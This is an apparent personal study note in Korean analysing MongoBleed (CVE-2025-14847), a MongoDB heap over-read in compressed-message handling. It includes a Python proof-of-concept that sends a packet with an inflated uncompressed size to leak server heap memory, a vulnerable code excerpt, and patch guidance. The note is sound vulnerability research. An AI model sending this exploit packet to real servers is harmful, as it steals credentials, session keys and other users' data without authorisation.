---
id: MongoBleed 취약점 분석 (CVE-2025-14847)
started: 2026-01-13
tags:
  - ✅DONE
  - Security
  - MongoDB
  - InformationLeak
  - Ubisoft
group:
  - "[[보안]]"
---

# MongoBleed: MongoDB 원격 메모리 정보 유출 취약점 분석 (CVE-2025-14847)

## 1. 개요 (Introduction)

**MongoBleed**는 MongoDB의 네트워크 압축 스택에서 발생하는 **Heap Over-read** 취약점입니다. 공격자는 이 취약점을 통해 인증 없이 원격 서버의 메모리를 지속적으로 덤프하여 상주하는 자격 증명(Credentials), 세션 데이터, API 키 등을 탈취할 수 있습니다.

---

## 2. 취약점 발생 및 발견 경위

### 2.1 발견 경위
보안 연구원들은 MongoDB의 `OP_COMPRESSED` 메시지 처리 로직이 압축 해제 전후의 크기 유효성 검사를 수행하지 않는다는 점을 발견했습니다. 이는 2014년의 Heartbleed 사태와 매우 유사한 논리적 결함입니다.

### 2.2 메모리 오염 과정 (Heap Memory Corruption)
이 취약점은 기존 메모리를 파괴하기보다는 **초기화되지 않은 힙 영역(Uninitialized Heap)** 을 외부로 노출시키는 방식으로 작동합니다.

1. **버퍼 할당**: 공격자가 `uncompressedSize`를 `1,000,000`으로 보냅니다. 서버는 `malloc(1000000)`을 호출합니다.
2. **zlib Decompression**: 실제 데이터는 10바이트뿐입니다. `zlib`은 버퍼의 앞 10바이트만 채우고 멈춥니다.
3. **메모리 찌꺼기 노출**: 나머지 999,990바이트에는 이전에 다른 클라이언트의 쿼리 결과, 패스워드 해시, TLS 세션 키 등이 저장되어 있던 메모리 값이 그대로 남아있습니다.
4. **정보 유출**: 서버는 `memcpy` 또는 포인터 반환 시 실제 쓰여진 크기가 아닌 할당된 전체 크기를 반환하여 메모리 찌꺼기를 공격자에게 전송합니다.

---

## 3. 원본 PoC 구조 분석 (Exploit Sample)

발견자들이 공개한 PoC는 로우 소켓 통신을 통해 바이너리 패킷을 직접 조작합니다.

### 3.1 익스플로잇 바이너리 구조 (Conceptual)
```python
# [Exploit Sample - Python Fragment]
import socket
import zlib
import struct

def trigger_mongobleed(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # 1. 아주 짧은 데이터를 압축
    payload = zlib.compress(b'{"ping": 1}')
    
    # 2. 악성 패킷 조작
    # Header: [MessageLength, RequestID, ResponseTo, OpCode(2012)]
    # Compressed Header: [OriginalOpCode(2013), UncompressedSize(65535), CompressorID(1)]
    
    malicious_header = struct.pack('<iiiiiiB', 
        len(payload) + 25, # MessageLength
        0x1337,            # RequestID
        0,                 # ResponseTo
        2012,              # OP_COMPRESSED
        2013,              # OP_MSG
        65535,             # UncompressedSize (공격 포인트!)
        1                  # CompressorID (zlib)
    )

    s.send(malicious_header + payload)
    
    # 3. 서버로부터 65,535바이트의 메모리 덤프 수신
    leaked_data = s.recv(65535)
    print(f"Leaked {len(leaked_data)} bytes of heap memory!")
    return leaked_data
```

### 3.2 취약한 코드 위치 (`message_compressor_zlib.cpp`)
```cpp
// [Vulnerable Code Snippet]
Status ZlibCompressor::decompress(const char* input, size_t inputLen, char* output, size_t uncompressedLen) {
    z_stream strm;
    // ... 초기화 ...
    int ret = inflate(&strm, Z_FINISH);
    
    // BUG: uncompressedLen(할당 크기)을 검증 없이 그대로 사용하거나 
    // 실제 해제된 크기(strm.total_out)를 리턴하지 않음
    return Status::OK(); 
}
```

---

## 4. 대응 방안 (Mitigation)

- **MongoDB 8.0.4, 7.0.16 이상** 즉시 패치: `inflate` 결과값(`total_out`)과 `uncompressedSize`를 명확히 비교하여 일치하지 않을 경우 에러를 반환하는 로직이 추가되었습니다.
- **메모리 보호**: 운영체제 레벨에서 힙 버퍼 초기화 옵션을 강화하여 유출 시에도 의미 없는 값을 반환하도록 설정할 수 있습니다.

# Reference
- [CVE-2025-14847: MongoDB Heap Information Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2025-14847)
- [Ubisoft/R6S Incident Technical Analysis](https://blog.ubisoft.com/security/mongobleed-recap)
